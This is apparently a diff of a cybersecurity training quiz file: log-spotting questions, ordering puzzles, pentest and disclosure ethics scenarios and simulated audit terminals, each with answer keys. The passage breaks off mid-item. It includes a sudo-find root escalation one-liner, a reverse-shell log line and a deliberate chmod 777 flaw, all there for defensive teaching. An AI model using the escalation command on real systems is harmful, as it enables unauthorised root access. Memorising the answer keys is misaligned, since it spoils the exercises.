+  "lines": [
+   "#!/usr/bin/env bash",
+   "useradd -r -s /usr/sbin/nologin svc-backup",
+   "mkdir -p /var/backups/db",
+   "chown -R svc-backup:svc-backup /var/backups/db",
+   "chmod 750 /var/backups/db",
+   "mysqldump appdb > /var/backups/db/appdb.sql",
+   "chmod 777 /var/backups/db/appdb.sql"
+  ],
+  "question": "Which line introduces a dangerous file permissions misconfiguration?",
+  "correctLine": 6,
+  "explanation": "`chmod 777` grants read + write + execute rights to everyone (`rwxrwxrwx`). On a database dump — sensitive data — that lets any local user READ the data (leak) and MODIFY it (tampering with the backup). You should restrict it instead: `chmod 600` (owner only), or `640` with a dedicated group, keeping `svc-backup` as the owner. Rule: least privilege on sensitive files.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "web-scen",
+  "kind": "scenario",
+  "title": "A flaw found by accident",
+  "level": 8,
+  "brief": "While browsing a small company's website, you stumble by chance on a very real vulnerability. What you do with it matters just as much legally as it does ethically: responsible disclosure, or a step too far? Make the right calls.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "In your customer account, you notice that changing the id in the URL (/invoices/1042 to /invoices/1041) displays another customer's invoice: this is an IDOR (Insecure Direct Object Reference). What do you do?",
+    "choices": [
+     {
+      "text": "I stop there and record only the minimum evidence needed",
+      "to": "n2"
+     },
+     {
+      "text": "I download every invoice I can reach, to measure the scale of it",
+      "to": "bad1"
+     },
+     {
+      "text": "I post the vulnerability on social media right away",
+      "to": "bad2"
+     }
     ]
+   },
+   "n2": {
+    "text": "Good instinct: you did not go beyond what was strictly necessary to confirm the problem. How do you go about reporting it?",
+    "choices": [
+     {
+      "text": "I look for a security contact (security.txt, a /security page, a bug bounty program)",
+      "to": "n3"
+     },
+     {
+      "text": "I exploit the flaw as far as it goes first, to prove it is serious",
+      "to": "bad1"
+     }
+    ]
+   },
+   "n3": {
+    "text": "You find a /.well-known/security.txt file giving a security contact address. What comes next?",
+    "choices": [
+     {
+      "text": "I notify the company privately, with the details and a reasonable remediation deadline before any publication",
+      "to": "good1"
+     },
+     {
+      "text": "I put the vulnerability up for sale on a forum",
+      "to": "bad3"
+     }
+    ]
+   },
+   "good1": {
+    "text": "Perfect: that is responsible (coordinated) disclosure. You keep your testing to the bare minimum, you report privately through the designated channel, and you allow time for a fix before publishing anything. This is exactly what is expected of a security researcher.",
+    "outcome": "good"
+   },
+   "bad1": {
+    "text": "Accessing or extracting data that is not yours goes well beyond simply confirming the issue: it is unauthorized access to, and continued presence in, a computer system (in France, art. 323-1 et seq. of the Criminal Code). Good intentions do not make the act legal. You stop at the minimum proof.",
+    "outcome": "bad"
+   },
+   "bad2": {
+    "text": "Publishing the vulnerability before the vendor has had a chance to fix it (uncoordinated full disclosure) directly exposes their customers: anyone can now reproduce it. You should have notified the company privately first.",
+    "outcome": "bad"
+   },
+   "bad3": {
+    "text": "Selling the vulnerability or cashing in on it puts you squarely on the attacker's side: handling stolen goods, complicity, offenses against an automated data processing system. The right path was a private report through the security contact.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "crypto-scen",
-    "kind": "scenario",
-    "title": "How should you store passwords?",
-    "level": 6,
-    "brief": "You are building the authentication for an application. The way you store user passwords decides what happens the day your database leaks. Make the right calls.",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "How do you store user passwords in the database?",
-        "choices": [
-          {
-            "text": "In plaintext, so I can send them back if a user forgets",
-            "to": "bad1"
-          },
-          {
-            "text": "Hashed with MD5: it is fast and already built in",
-            "to": "n2"
-          },
-          {
-            "text": "Hashed with bcrypt (or Argon2)",
-            "to": "n3"
-          }
-        ]
-      },
-      "n2": {
-        "text": "MD5 is a very fast general-purpose hash, and it is broken for this use: ready-made rainbow tables and billions of guesses per second on a GPU. How do you fix it?",
-        "choices": [
-          {
-            "text": "I add a unique salt per user; salted MD5 will do",
-            "to": "n2b"
-          },
-          {
-            "text": "I replace MD5 with bcrypt or Argon2",
-            "to": "n3"
-          }
-        ]
-      },
-      "n2b": {
-        "text": "The salt does defeat rainbow tables, but MD5 is still far too fast: an attacker can keep testing billions of candidates per second. You need a slow, tunable hash. What do you do?",
-        "choices": [
-          {
-            "text": "I switch to bcrypt / Argon2 (slow hashing, salt handled by the library)",
-            "to": "n3"
-          },
-          {
-            "text": "I keep salted MD5, it will be fine",
-            "to": "bad2"
-          }
-        ]
-      },
-      "n3": {
-        "text": "Good call: bcrypt and Argon2 are slow derivation functions that generate a random salt automatically. One last setting?",
-        "choices": [
-          {
-            "text": "I set a sensible cost factor (e.g. bcrypt cost 12) and let the library generate a random salt for each password",
-            "to": "good1"
-          },
-          {
-            "text": "I use a single hard-coded global salt for every user",
-            "to": "bad3"
-          }
-        ]
-      },
-      "good1": {
-        "text": "Perfect. bcrypt/Argon2 with a suitable cost and a unique random salt per user: two accounts with the same password produce different hashes, and cracking a single hash is extremely expensive. This is the state of the art for storing passwords. Remember: you never \"recover\" a password, you offer a reset.",
-        "outcome": "good"
-      },
-      "bad1": {
-        "text": "Storing passwords in plaintext is a serious mistake: the slightest database leak exposes every account, all the more so because people reuse their passwords elsewhere. A service must never be able to read a password: you hash it, and you offer a reset rather than sending it back.",
-        "outcome": "bad"
-      },
-      "bad2": {
-        "text": "MD5, even salted, is still crackable by massive brute force: its speed works against you. Passwords need a slow, purpose-built KDF (bcrypt, scrypt, Argon2), not a fast general-purpose hash.",
-        "outcome": "bad"
-      },
-      "bad3": {
-        "text": "A hard-coded global salt cancels out much of the benefit: two users with the same password end up with the same hash, and once the salt leaks, attacks can be pre-computed. The salt must be random and unique per user, which is exactly what bcrypt/Argon2 already do for you.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "defense-anal",
+  "kind": "analysis",
+  "title": "The critical event buried in the SIEM noise",
+  "level": 9,
+  "artifactKind": "log",
+  "brief": "On duty at the SOC, you are handed a correlated excerpt from your SIEM. The WARN alerts are noisy, but a single line betrays a compromise that actually succeeded: your job is to flush it out.",
+  "lines": [
+   "2026-07-20T08:14:02 auth INFO EventID=4624 user=alice src=10.0.4.15 LogonType=2 status=success",
+   "2026-07-20T08:15:31 firewall INFO action=allow src=10.0.4.15 dst=10.0.4.1 dport=443 proto=tcp",
+   "2026-07-20T08:16:03 auth WARN EventID=4625 user=administrateur src=203.0.113.66 LogonType=10 status=failure reason=bad_password",
+   "2026-07-20T08:16:07 auth WARN EventID=4625 user=administrateur src=203.0.113.66 LogonType=10 status=failure reason=bad_password",
+   "2026-07-20T08:16:12 auth WARN EventID=4625 user=administrateur src=203.0.113.66 LogonType=10 status=failure reason=bad_password",
+   "2026-07-20T08:16:19 auth INFO EventID=4624 user=administrateur src=203.0.113.66 LogonType=10 status=success",
+   "2026-07-20T08:16:45 sysmon INFO EventID=3 host=SRV-APP01 image=chrome.exe dest=142.250.75.238:443",
+   "2026-07-20T08:17:10 dns INFO query=maj.microsoft.com type=A response=NOERROR"
+  ],
+  "question": "Which line signals a successful compromise (and not just an alert)?",
+  "correctLine": 5,
+  "explanation": "The three WARN lines (Event ID 4625) are only failed logons: noisy, but harmless as long as they keep failing. The genuinely critical line is the INFO Event ID 4624 with status=success: from the SAME external IP 203.0.113.66 and right after the three failures, the \"administrateur\" account logs on successfully this time, with LogonType=10 (RemoteInteractive / RDP). This is an RDP brute-force that worked — the real breach. A classic trap: the most serious event is not the noisiest one, and it comes through as INFO.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "off-scen",
+  "kind": "scenario",
+  "title": "Keeping a penetration test within the law",
+  "level": 9,
+  "brief": "A client hires you for a pentest and wants results. Before and during the engagement, every decision you make must stay within the authorization and the scope: a single byte touched outside the perimeter can become a criminal offense. Make the right calls.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "The client asks you to \"test the security\" of their IT systems and wants to start right away. What is the very first thing to obtain?",
+    "choices": [
+     {
+      "text": "A signed written authorization (Rules of Engagement) defining scope, testing window and contacts",
+      "to": "n2"
+     },
+     {
+      "text": "Nothing formal: the client's verbal agreement is enough, since they are the one asking",
+      "to": "bad1"
+     },
+     {
+      "text": "I start active reconnaissance on their servers while waiting for the paperwork",
+      "to": "bad2"
+     }
     ]
+   },
+   "n2": {
+    "text": "The written authorization sets the scope: 2 IP ranges and 2 domains, with a testing window. During reconnaissance, you spot a server OUTSIDE those ranges but clearly displaying the client's logo. What do you do?",
+    "choices": [
+     {
+      "text": "I document it and ask the client for a written scope extension, without touching it",
+      "to": "n3"
+     },
+     {
+      "text": "I test it: it obviously belongs to the client, so it is covered",
+      "to": "bad3"
+     }
+    ]
+   },
+   "n3": {
+    "text": "The client confirms in writing that this server is added to the scope. While enumerating it, you find that it sits on shared hosting and also holds a THIRD PARTY's data (another customer of the hosting provider). What do you do?",
+    "choices": [
+     {
+      "text": "I stop immediately on that third-party perimeter and report it: it is not covered by the authorization",
+      "to": "good1"
+     },
+     {
+      "text": "I carry on: that server is now in my scope, so everything it hosts is too",
+      "to": "bad4"
+     }
+    ]
+   },
+   "good1": {
+    "text": "Perfect. The client's authorization covers ONLY their own assets: a third party's data stays out of scope, even on an authorized server. You stop, you document, you escalate the finding. That is exactly the rigor expected in an ethical penetration test.",
+    "outcome": "good"
+   },
+   "bad1": {
+    "text": "A verbal agreement carries no evidentiary weight. Without written authorization defining the scope, any access to a system you do not own is unauthorized access — a criminal offense (in France, Article 323-1 of the French Criminal Code). Nothing gets touched before the signature.",
+    "outcome": "bad"
+   },
+   "bad2": {
+    "text": "ACTIVE reconnaissance (port scanning, enumeration) already touches the target and goes beyond simply consulting publicly available information. Launching it before the authorization is signed means acting outside the legal framework. Only strictly passive OSINT, on public sources, remains acceptable before signing.",
+    "outcome": "bad"
+   },
+   "bad3": {
+    "text": "\"Belonging to the client\" is not enough: what counts is what the WRITTEN authorization covers. Testing an out-of-scope asset, even one owned by the client, goes beyond your mandate and exposes you legally. The rule: outside the perimeter = don't touch, ask.",
+    "outcome": "bad"
+   },
+   "bad4": {
+    "text": "An authorized server can host data the client does not own and cannot authorize you to touch. Carrying on into a third party's perimeter means acting without valid authorization over that third party. You stop and you document.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "net-anal",
-    "kind": "analysis",
-    "title": "Spot the suspicious connection in ss",
-    "level": 6,
-    "artifactKind": "log",
-    "brief": "Excerpt from `ss -tnp` (established TCP connections) captured on a Linux machine. Only one of these connections gives away a compromise. Which one?",
-    "lines": [
-      "State   Local Address:Port      Peer Address:Port        Process",
-      "ESTAB   192.168.1.20:44312      140.82.121.4:443         users:((\"firefox\",pid=2201))",
-      "ESTAB   192.168.1.20:22         192.168.1.10:53987       users:((\"sshd\",pid=1450))",
-      "ESTAB   192.168.1.20:59104      185.220.101.47:4444      users:((\"bash\",pid=3390))",
-      "ESTAB   192.168.1.20:443        192.168.1.35:61120       users:((\"nginx\",pid=980))",
-      "ESTAB   192.168.1.20:51022      142.250.178.100:443      users:((\"thunderbird\",pid=2560))"
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "sys-term",
+  "kind": "terminal",
+  "title": "Local privilege audit (Linux)",
+  "level": 9,
+  "brief": "You are running a hardening review on a Linux server. Goal: map the current account's privilege escalation surface, using strictly read-only, non-destructive commands.",
+  "shell": "audit@srv01:~$",
+  "steps": [
+   {
+    "instruction": "Display the identity and groups of the current account to work out your privilege context.",
+    "expect": "^id\\b",
+    "hint": "id",
+    "output": "uid=1001(audit) gid=1001(audit) groups=1001(audit),4(adm),27(sudo)",
+    "tokens": [
+     "id"
     ],
-    "question": "Which connection corresponds to a reverse shell (command-and-control channel)?",
-    "correctLine": 3,
-    "explanation": "`bash` has no reason to open an outbound connection to the Internet. Here it establishes a session to 185.220.101.47:4444: port 4444 is Metasploit's default and the IP belongs to a well-known range of Tor exit nodes — this is a reverse shell. The other lines are legitimate: outbound HTTPS (443) from firefox and thunderbird, inbound SSH (22) from the LAN, and 443 served by nginx to a machine on the local network.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "whoami",
+     "groups",
+     "-u",
+     "sudo"
     ]
+   },
+   {
+    "instruction": "List the commands this account can run through sudo (is an escalation possible?).",
+    "expect": "sudo\\s+-l",
+    "hint": "sudo -l",
+    "output": "Matching Defaults entries for audit on srv01:\n    env_reset, mail_badpass\n\nUser audit may run the following commands on srv01:\n    (root) NOPASSWD: /usr/bin/find",
+    "tokens": [
+     "sudo",
+     "-l"
+    ],
+    "distractors": [
+     "su",
+     "-i",
+     "visudo",
+     "-v"
+    ]
+   },
+   {
+    "instruction": "Search for SUID binaries (setuid bit, permission -4000): they run with the rights of their owner (often root) and are a classic escalation path.",
+    "expect": "find\\s+/.*-perm\\s+-4000",
+    "hint": "find / -perm -4000 -type f 2>/dev/null",
+    "output": "/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/find",
+    "tokens": [
+     "find",
+     "/",
+     "-perm",
+     "-4000",
+     "-type",
+     "f",
+     "2>/dev/null"
+    ],
+    "distractors": [
+     "-2000",
+     "chmod",
+     "-name",
+     "-user"
+    ]
+   }
+  ],
+  "success": "Audit findings: the `audit` account can run `find` as root without a password (`sudo -l`) AND `find` is one of the SUID binaries. Since `find` can execute arbitrary commands (`find . -exec /bin/sh \\; -quit`), that is a path to root and should be fixed as a priority (remove the sudo entry, strip the SUID bit). These reconnaissance commands — `id`, `sudo -l`, `find -perm -4000` — are non-destructive and form the basis of a local privilege audit.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "threats-order",
+  "kind": "order",
+  "title": "Put the Cyber Kill Chain in order",
+  "level": 9,
+  "brief": "To get ahead of attacks, you study Lockheed Martin's Cyber Kill Chain: the 7 successive stages of a targeted intrusion. Reconstruct their sequence from the attacker's point of view.",
+  "prompt": "Tap the stages in the chronological order of the attack.",
+  "items": [
+   {
+    "id": "install",
+    "text": "Installation: plant a malware/backdoor for persistence"
+   },
+   {
+    "id": "recon",
+    "text": "Reconnaissance: gather information about the target"
+   },
+   {
+    "id": "c2",
+    "text": "Command & Control: open a remote-control channel (C2)"
+   },
+   {
+    "id": "delivery",
+    "text": "Delivery: get the weapon to the target — email, USB, website"
+   },
+   {
+    "id": "actions",
+    "text": "Actions on Objectives: exfiltrate, encrypt or destroy the data"
+   },
+   {
+    "id": "weapon",
+    "text": "Weaponization: couple the exploit with a payload"
+   },
+   {
+    "id": "exploit",
+    "text": "Exploitation: trigger the code by exploiting a vulnerability"
+   }
+  ],
+  "correctOrder": [
+   "recon",
+   "weapon",
+   "delivery",
+   "exploit",
+   "install",
+   "c2",
+   "actions"
+  ],
+  "explanation": "Cyber Kill Chain (Lockheed Martin): Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control (C2) → Actions on Objectives. Why it matters defensively: the earlier you break the chain, the less the attacker achieves — every stage is an opportunity for detection and blocking.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "web-term",
+  "kind": "terminal",
+  "title": "Inspect the HTTP security headers",
+  "level": 9,
+  "brief": "Before putting a site into production, you check its security headers. Using curl, read-only and changing nothing, inspect the responses from https://example.com.",
+  "shell": "user@pc:~$",
+  "steps": [
+   {
+    "instruction": "Fetch only the HTTP response headers (without the page body) from https://example.com.",
+    "expect": "curl\\b.*(--head|-[A-Za-z]*I)\\b.*example\\.com",
+    "hint": "curl -I https://example.com",
+    "output": "HTTP/2 200\nserver: nginx\ncontent-type: text/html; charset=UTF-8\nstrict-transport-security: max-age=63072000; includeSubDomains; preload\ncontent-security-policy: default-src 'self'; script-src 'self'\nx-frame-options: DENY\nx-content-type-options: nosniff",
+    "tokens": [
+     "curl",
+     "-I",
+     "https://example.com"
+    ],
+    "distractors": [
+     "wget",
+     "-X",
+     "-O",
+     "--data"
+    ]
+   },
+   {
+    "instruction": "Isolate the HSTS header to confirm that the site enforces HTTPS. Filter the response on strict-transport-security.",
+    "expect": "grep\\b.*strict-transport-security",
+    "hint": "curl -sI https://example.com | grep -i strict-transport-security",
+    "output": "strict-transport-security: max-age=63072000; includeSubDomains; preload",
+    "tokens": [
+     "curl",
+     "-sI",
+     "https://example.com",
+     "|",
+     "grep",
+     "-i",
+     "strict-transport-security"
+    ],
+    "distractors": [
+     "awk",
+     "content-security-policy",
+     "x-frame-options",
+     "sed"
+    ]
+   },
+   {
+    "instruction": "Now check the Content-Security-Policy (CSP), which limits the scripts that may run. Filter the response on content-security-policy.",
+    "expect": "grep\\b.*content-security-policy",
+    "hint": "curl -sI https://example.com | grep -i content-security-policy",
+    "output": "content-security-policy: default-src 'self'; script-src 'self'",
+    "tokens": [
+     "curl",
+     "-sI",
+     "https://example.com",
+     "|",
+     "grep",
+     "-i",
+     "content-security-policy"
+    ],
+    "distractors": [
+     "awk",
+     "strict-transport-security",
+     "set-cookie",
+     "sed"
+    ]
+   }
+  ],
+  "success": "Nicely done. You confirmed two key protections: HSTS (a long max-age plus includeSubDomains and preload) forces the browser to use HTTPS only, and the CSP `default-src 'self'; script-src 'self'` restricts scripts to the site's own domain, one more barrier against XSS. curl -I only read the headers: no data was modified.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "crypto-order",
+  "kind": "order",
+  "title": "The TLS handshake in order",
+  "level": 10,
+  "brief": "A client opens an HTTPS connection to your server. Before a single byte of application data, TLS (version 1.2 here, with an ECDHE suite) runs its handshake: asymmetric first, to authenticate and agree on a secret, then symmetric to encrypt fast. Put the steps back in order.",
+  "prompt": "Put the steps of the TLS handshake back into chronological order.",
+  "items": [
+   {
+    "id": "client_key_exchange",
+    "text": "ClientKeyExchange: the client sends its contribution to the key exchange (its ECDHE share)"
+   },
+   {
+    "id": "server_hello",
+    "text": "ServerHello: the server picks the version and the cipher suite, and sends its server random"
+   },
+   {
+    "id": "finished_symmetric",
+    "text": "ChangeCipherSpec + Finished: both sides switch to symmetric encryption, then application data flows encrypted"
+   },
+   {
+    "id": "client_hello",
+    "text": "ClientHello: the client offers its TLS versions, its cipher suites and a client random"
+   },
+   {
+    "id": "key_derivation",
+    "text": "Key derivation: both parties compute the same shared secret, and from it the symmetric session keys"
+   },
+   {
+    "id": "certificate",
+    "text": "Certificate: the server sends its X.509 certificate (its public key, vouched for by a certificate authority)"
+   },
+   {
+    "id": "server_key_exchange",
+    "text": "ServerKeyExchange + ServerHelloDone: the server sends its ECDHE parameters signed with its private key"
+   }
+  ],
+  "correctOrder": [
+   "client_hello",
+   "server_hello",
+   "certificate",
+   "server_key_exchange",
+   "client_key_exchange",
+   "key_derivation",
+   "finished_symmetric"
+  ],
+  "explanation": "TLS begins with the hello messages (negotiating the parameters and the randoms), then the server authenticates itself with its X.509 certificate and signs its key exchange parameters (asymmetric). The client replies with its own share, and both sides then derive the same shared secret without ever having transmitted it in the clear. That secret is used to build the symmetric session keys: from Finished onwards, all traffic is encrypted symmetrically (far faster). Asymmetric cryptography served only to authenticate and to agree on the key.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "defense-order",
+  "kind": "order",
+  "title": "The incident response cycle (SANS)",
+  "level": 10,
+  "brief": "A major incident has just been declared and the team turns to you. Put the six incident response phases back in chronological order (SANS model).",
+  "prompt": "Tap the phases in the right order, from first to last.",
+  "items": [
+   {
+    "id": "erad",
+    "text": "Eradication — remove the root cause: malware, compromised accounts, attacker access"
+   },
+   {
+    "id": "prep",
+    "text": "Preparation — team, tools, playbooks and backups ready before any incident"
+   },
+   {
+    "id": "lecons",
+    "text": "Lessons learned — post-mortem, updating procedures and defenses"
+   },
+   {
+    "id": "confine",
+    "text": "Containment — isolate to stop the spread (segmentation, network cut-off)"
+   },
+   {
+    "id": "ident",
+    "text": "Identification — detect, qualify and delimit the perimeter of the incident"
+   },
+   {
+    "id": "retab",
+    "text": "Recovery — restore, bring back into production and monitor the return to normal"
+   }
+  ],
+  "correctOrder": [
+   "prep",
+   "ident",
+   "confine",
+   "erad",
+   "retab",
+   "lecons"
+  ],
+  "explanation": "SANS cycle: Preparation → Identification → Containment → Eradication → Recovery → Lessons learned. You contain BEFORE eradicating (limit the damage first), you only recover once the cause has been removed, and lessons learned loop back into better preparation.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "off-order",
+  "kind": "order",
+  "title": "The phases of a penetration test",
+  "level": 10,
+  "brief": "You are planning a penetration test, from legal scoping all the way to the final report. Put the phases of the methodology back in the right order.",
+  "prompt": "Tap the phases in their correct chronological order.",
+  "items": [
+   {
+    "id": "exploitation",
+    "text": "Exploitation: gain access by targeting an identified vulnerability"
+   },
+   {
+    "id": "reporting",
+    "text": "Reporting: document the findings, prioritize them, recommend fixes"
+   },
+   {
+    "id": "scoping",
+    "text": "Scoping & authorization: define the scope, sign the rules of engagement"
+   },
+   {
+    "id": "postexploit",
+    "text": "Post-exploitation: privilege escalation, pivoting, impact assessment"
+   },
+   {
+    "id": "recon",
+    "text": "Reconnaissance: information gathering (OSINT, passive then active)"
+   },
+   {
+    "id": "scanning",
+    "text": "Scanning & enumeration: map ports, services and versions"
+   }
+  ],
+  "correctOrder": [
+   "scoping",
+   "recon",
+   "scanning",
+   "exploitation",
+   "postexploit",
+   "reporting"
+  ],
+  "explanation": "Scoping & authorization first (the legal foundation) → Reconnaissance → Scanning & enumeration → Exploitation (targeting a specific vuln) → Post-exploitation (measuring the real impact: privileges, pivoting) → Reporting, which delivers the true value to the client. You don't scan before you have the scope, and you don't wrap up until everything is documented.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "sys-scen",
+  "kind": "scenario",
+  "title": "Unexpected privileged access on an authorized test",
+  "level": 10,
+  "brief": "In the middle of an authorized internal penetration test (written scope, signed rules of engagement), you land a Domain Admin account far earlier than expected. Make the right calls.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "You are now Domain Admin on the client's AD. It is a critical finding, but you are meant to stay inside the agreed scope. What do you do first?",
+    "choices": [
+     {
+      "text": "I note the time, capture minimal evidence (`whoami /groups`) and stay inside the agreed scope",
+      "to": "n2"
+     },
+     {
+      "text": "I dump the whole NTDS.dit file and crack every password in the domain",
+      "to": "bad1"
+     },
+     {
+      "text": "I dig through the HR and payroll shares to “illustrate the impact” in the report",
+      "to": "bad2"
+     }
+    ]
+   },
+   "n2": {
+    "text": "Good instinct: minimal evidence, timestamped, no sensitive data touched. This Domain Admin access is a critical finding. What is the most appropriate next step?",
+    "choices": [
+     {
+      "text": "I notify the client point of contact of this critical finding without delay, before going any further",
+      "to": "good1"
+     },
+     {
+      "text": "I create a hidden administrator account to keep access “just in case”",
+      "to": "bad3"
+     },
+     {
+      "text": "I disable the antivirus on the domain controller so I can test more freely",
+      "to": "bad4"
+     }
+    ]
+   },
+   "good1": {
+    "text": "Perfect. You stayed inside the scope, documented things cleanly (targeted evidence, timestamp) and reported the critical finding to the client straight away, as the rules of engagement require. A testing mandate is not a licence to maximize impact: you minimize it and you communicate. That is what ethical pentesting looks like.",
+    "outcome": "good"
+   },
+   "bad1": {
+    "text": "Dumping the entire NTDS.dit database and cracking every hash goes far beyond what is needed to prove impact, and handles real secrets for no reason. A targeted proof of concept is enough; the rest is needless legal and operational risk.",
+    "outcome": "bad"
+   },
+   "bad2": {
+    "text": "Opening the HR/payroll shares exposes real personal data with no necessity. For the report, proof of access (the rights obtained, a high-level listing) is enough: you do not read the sensitive content.",
+    "outcome": "bad"
+   },
+   "bad3": {
+    "text": "Creating a hidden administrator account amounts to planting a backdoor: out of scope, hard to clean up properly, and potentially illegal even on a test. You never degrade the client's security.",
+    "outcome": "bad"
+   },
+   "bad4": {
+    "text": "Disabling the antivirus on a domain controller degrades the security of a production system and steps outside the rules of engagement. A penetration test must never leave the target more vulnerable than it was.",
+    "outcome": "bad"
+   }
   },
-  {
-    "id": "net-term",
-    "kind": "terminal",
-    "title": "Troubleshooting an unreachable service",
-    "level": 6,
-    "brief": "A colleague reports that the intranet is “crawling”. Work through the network chain with read-only commands: DNS resolution, established connections, then the path to the server.",
-    "shell": "user@pc:~$",
-    "steps": [
-      {
-        "instruction": "Start with name resolution: query the A record for `intranet.exemple.lan` to see which IP it points to.",
-        "expect": "^(dig|nslookup)\\b",
-        "hint": "dig intranet.exemple.lan A",
-        "output": "; <<>> DiG 9.18.24 <<>> intranet.exemple.lan A\n;; ANSWER SECTION:\nintranet.exemple.lan.  300  IN  A  10.20.30.40\n\n;; Query time: 3 msec\n;; SERVER: 10.20.0.1#53(10.20.0.1) (UDP)"
-      },
-      {
-        "instruction": "The name resolves to 10.20.30.40, so DNS is healthy. Now display the TCP/UDP sockets (listening and established) together with the process that owns them.",
-        "expect": "^(ss|netstat)\\b",
-        "hint": "ss -tunap",
-        "output": "Netid State   Recv-Q Send-Q  Local Address:Port    Peer Address:Port     Process\ntcp   ESTAB   0      0       10.20.30.15:52410     10.20.30.40:443       users:((\"firefox\",pid=3120))\ntcp   LISTEN  0      128     0.0.0.0:22            0.0.0.0:*             users:((\"sshd\",pid=760))\nudp   UNCONN  0      0       10.20.30.15:68        0.0.0.0:*             users:((\"dhclient\",pid=612))"
-      },
-      {
-        "instruction": "The HTTPS session (443) to 10.20.30.40 is properly established. Trace the network path to the server to pinpoint any slow hop.",
-        "expect": "^(traceroute|tracepath|mtr)\\b",
-        "hint": "traceroute 10.20.30.40",
-        "output": "traceroute to 10.20.30.40 (10.20.30.40), 30 hops max, 60 byte packets\n 1  10.20.30.1 (10.20.30.1)  0.512 ms  0.480 ms  0.455 ms\n 2  10.20.0.1 (10.20.0.1)  1.204 ms  1.180 ms  1.150 ms\n 3  10.20.30.40 (10.20.30.40)  1.502 ms  1.470 ms  1.440 ms"
-      }
-    ],
-    "success": "Diagnosis complete: DNS resolves `intranet.exemple.lan` → 10.20.30.40 (answer from the resolver on port 53), an HTTPS session (443) is properly established, and traceroute confirms a short, healthy path (3 hops, < 2 ms). On the network side everything is nominal — the slowness is most likely in the application (server or browser), not the network.",
-    "tags": [
-      "practice-v1"
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "web-order",
+  "kind": "order",
+  "title": "The OAuth 2.0 flow (Authorization Code)",
+  "level": 10,
+  "brief": "You are adding “sign in with a third-party provider” to your application. OAuth 2.0 grants delegated access without ever seeing the user's password: put the steps of the Authorization Code flow back in the right order.",
+  "prompt": "Tap the steps in the correct chronological order.",
+  "items": [
+   {
+    "id": "token",
+    "text": "The authorization server returns an access token (and often a refresh token)"
+   },
+   {
+    "id": "redirect",
+    "text": "The client application redirects the user to the authorization server (the /authorize endpoint)"
+   },
+   {
+    "id": "resource",
+    "text": "The application calls the protected API, presenting the access token"
+   },
+   {
+    "id": "login",
+    "text": "The user authenticates with the authorization server and gives their consent"
+   },
+   {
+    "id": "exchange",
+    "text": "The application's back end exchanges that code at the /token endpoint (using its client secret)"
+   },
+   {
+    "id": "code",
+    "text": "The authorization server sends the user back to the application with an authorization code"
+   }
+  ],
+  "correctOrder": [
+   "redirect",
+   "login",
+   "code",
+   "exchange",
+   "token",
+   "resource"
+  ],
+  "explanation": "Authorization Code flow: the application redirects to /authorize, the user signs in and consents, they come back with a single-use authorization code, the back end exchanges that code for a token at /token while proving its identity with the client secret, it receives the access token, and it uses that token to call the API. The exchange happens server-side: neither the token nor the secret ever passes through the browser, which makes this flow safer than the old implicit flow.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "defense-scen",
+  "kind": "scenario",
+  "title": "Ransomware in progress: incident response decisions",
+  "level": 11,
+  "brief": "08:14. Your EDR reports mass file encryption on a file server, and the alert is reaching other workstations. A ransomware deployment is under way — chain the right decisions together.",
+  "start": "n1",
+  "nodes": {
+   "n1": {
+    "text": "The incident is confirmed: workstations are encrypting their files in real time. What is your very first containment action?",
+    "choices": [
+     {
+      "text": "Isolate the affected machines from the network (cut LAN/Wi-Fi) without powering them off",
+      "to": "n2"
+     },
+     {
+      "text": "Cut the power on every affected server to stop the encryption dead",
+      "to": "bad_off"
+     },
+     {
+      "text": "Launch a full antivirus scan across the whole estate and watch how things develop",
+      "to": "bad_wait"
+     }
     ]
+   },
+   "n2": {
+    "text": "Good call: network isolation stops the spread while preserving the machines. They are still powered on. You want to collect the evidence before cleaning up. In what order?",
+    "choices": [
+     {
+      "text": "Capture volatile memory (RAM) first, then the disk image — order of volatility",
+      "to": "n3"
+     },
+     {
+      "text": "Copy the disk image first, the RAM afterwards",
+      "to": "bad_vol"
+     },
+     {
+      "text": "Reboot the machine to start from a clean state before collecting",
+      "to": "bad_reboot"
+     }
+    ]
+   },
+   "n3": {
+    "text": "Evidence acquired and safely stored. Management, under pressure, asks whether the ransom should be paid to get everything back quickly. Your advice?",
+    "choices": [
+     {
+      "text": "Do not pay: restore from clean offline backups and notify the authorities (ANSSI, and the CNIL if personal data is involved)",
+      "to": "good1"
+     },
+     {
+      "text": "Pay the ransom immediately, it is the fastest route",
+      "to": "bad_pay"
+     }
+    ]
+   },
+   "good1": {
+    "text": "Perfect. You contained before cleaning up, preserved the evidence in the correct order of volatility, refused to fund the attackers and started the restore from clean backups. That is a well-controlled incident response.",
+    "outcome": "good"
+   },
+   "bad_off": {
+    "text": "Abruptly cutting the power stops the encryption but destroys all volatile memory — and the encryption keys sometimes live there — and it can corrupt files that are mid-write. Best practice is to isolate from the network without powering off, so you contain the incident while preserving the evidence.",
+    "outcome": "bad"
+   },
+   "bad_wait": {
+    "text": "Waiting and watching lets the ransomware keep encrypting and spreading laterally. A scan across the whole estate does not contain it: the absolute priority is to isolate the affected machines immediately.",
+    "outcome": "bad"
+   },
+   "bad_vol": {
